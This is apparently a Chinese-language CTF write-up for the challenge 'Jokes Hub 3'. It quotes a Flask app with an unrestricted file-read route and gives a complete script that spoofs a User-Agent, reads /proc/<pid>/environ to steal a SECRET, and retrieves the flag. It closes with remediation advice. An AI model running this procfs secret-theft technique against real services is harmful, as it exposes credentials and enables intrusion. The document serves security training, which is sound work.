# Jokes Hub 3

## 题目简述

第三题继续使用同一部署。第二题泄露的 `flagger.py` 表明隐藏应用提供任意文件读取路由 `/fileReader/`，以及受环境变量 `SECRET` 保护的 `/getFlag/<secret>`。Nginx 只在 User-Agent 精确为 `flagger-user` 时把请求转发给该应用。

目标是借助文件读取访问 `/proc/<pid>/environ`，从 flagger 进程环境中恢复 `SECRET`，再调用受保护路由执行 `/flag`。

## 解题过程

隐藏应用的关键代码为：

```python
SECRET = os.getenv("SECRET")

@flagger.route('/getFlag/<secret>', methods=['GET'])
def getFlag(secret):
    if secret == SECRET:
        return os.popen("/flag").read()
    return "Wrong secret"

@flagger.route('/fileReader/', methods=['GET'])
def getFile():
    file = request.args.get("file", "")
    if os.path.exists(file):
        return open(file).read()
    return "File doesn't exist"
```

文件参数没有基准目录或允许列表，可以读取进程权限范围内的任意路径。Linux 的 `/proc/<pid>/environ` 以 `NUL` 分隔保存目标进程环境变量；只要枚举到 flagger 的 PID，就能找到以 `SECRET=` 开头的条目。

完整脚本如下。每个请求都必须携带特殊 User-Agent，否则会被代理到普通笑话应用：

```python
from urllib.parse import quote

import requests

base = "http://127.0.0.1:8000"
headers = {"User-Agent": "flagger-user"}
secret = None

for pid in range(1, 5000):
    try:
        r = requests.get(
            base + "/fileReader/",
            params={"file": f"/proc/{pid}/environ"},
            headers=headers,
            timeout=2,
        )
    except requests.RequestException:
        continue

    for entry in r.content.split(b"\x00"):
        if entry.startswith(b"SECRET="):
            secret = entry.split(b"=", 1)[1].decode()
            print("pid:", pid, "secret:", secret)
            break
    if secret is not None:
        break

if secret is None:
    raise RuntimeError("flagger process not found")

r = requests.get(
    base + "/getFlag/" + quote(secret, safe=""),
    headers=headers,
)
print(r.text)
```

仓库中的启动脚本也印证了该秘密通过环境变量注入到 flagger uWSGI 进程，而不是写在普通 Web 响应中。成功请求会执行服务器上的 `/flag` 程序并返回：

```text
Shellmates{A_L0ng_waY-Fr0m_LAUGHING_AT_J0K3$_T0_My_SYSTEM}
```

这里的前缀确实是大写 `Shellmates`，与前两题不同。

## 方法总结

整条链路跨越了多个信任边界：SQL 注入和 fileio 泄露反向代理配置及隐藏源码；可伪造的 User-Agent 获得隐藏 upstream 的访问路径；任意文件读再通过 procfs 泄露进程环境。环境变量能避免秘密写入代码仓库，却不是抵抗同权限任意文件读的安全存储。

修复应删除 `/fileReader/` 或将其限制在固定、规范化后的非敏感目录，并使用真正的内部网络或认证机制保护 flagger，不能把 User-Agent 当作身份。运行服务时还可通过不同 Unix 用户、容器和 procfs 隔离减少跨进程读取，但这些措施不能替代对文件路径的严格授权。
